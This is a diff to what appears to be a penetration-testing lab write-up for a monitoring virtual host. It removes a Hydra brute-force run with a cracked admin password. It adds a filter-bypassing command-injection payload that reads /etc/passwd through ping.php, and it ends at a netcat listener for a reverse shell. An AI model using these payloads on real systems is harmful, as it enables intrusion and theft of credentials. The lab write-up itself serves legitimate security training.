@@ -383,26 +383,36 @@ The shell accessible is very limited:
 
 ![](./vhosts/monitoring/monitoring1.png)
 
+
 Enumerating source code:
 
-```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
-Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+![](./vhosts/monitoring/monitoring2.png)
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
-[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
-[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
-                                                                                 
-```
-```
+looking into main.js an interesting endpoint is disclosed, which executes a ping command on the underlying server, possibly vulnerable to a command injection:
 
 
+![](./vhosts/monitoring/monitoring3.png)
+
+testing the endpoint:
+
+![](./vhosts/monitoring/monitoring4.png)
+
+command injection works, %0a is \n url endcoded and its not blacklisted:
+
 ```
+/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+![](./vhosts/monitoring/monitoring5.png)
+
+reading ping.php:
+![](./vhosts/monitoring/monitoring6.png)
+
+
+
+```
+
+
 ──(kali㉿kali)-[~/labs/aen]
 └─$ nc -lvnp 9001
 listening on [any] 9001 ...
